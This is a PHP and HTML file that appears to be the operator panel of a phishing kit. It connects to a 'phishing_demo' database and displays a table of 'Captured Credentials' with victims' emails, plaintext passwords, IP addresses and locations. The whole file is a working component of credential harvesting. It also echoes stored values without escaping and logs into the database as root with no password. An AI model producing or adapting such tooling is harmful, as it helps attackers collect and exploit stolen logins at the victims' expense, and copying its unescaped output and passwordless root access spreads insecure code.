<?php
$conn = new mysqli("localhost", "root", "", "phishing_demo");
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

$result = $conn->query("SELECT * FROM credentials ORDER BY created_at DESC");
?>

<!DOCTYPE html>
<html>
<head>
  <title>Captured Credentials</title>
  <style>
    table {
      width: 90%;
      margin: auto;
      border-collapse: collapse;
    }
    th, td {
      padding: 12px;
      border: 1px solid #ccc;
      text-align: center;
    }
    th {
      background-color: #f2f2f2;
    }
    h2 {
      text-align: center;
    }
  </style>
</head>
<body>
  <h2>Captured Credentials</h2>
  <table>
    <tr>
      <th>ID</th>
      <th>Email</th>
      <th>Password</th>
      <th>IP Address</th>
      <th>Location</th>
      <th>Time</th>
    </tr>
    <?php
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            echo "<tr>
              <td>{$row['id']}</td>
              <td>{$row['email']}</td>
              <td>{$row['password']}</td>
              <td>{$row['ip_address']}</td>
              <td>{$row['location']}</td>
              <td>{$row['created_at']}</td>
            </tr>";
        }
    } else {
        echo "<tr><td colspan='6'>No credentials found.</td></tr>";
    }
    $conn->close();
    ?>
  </table>
</body>
</html>
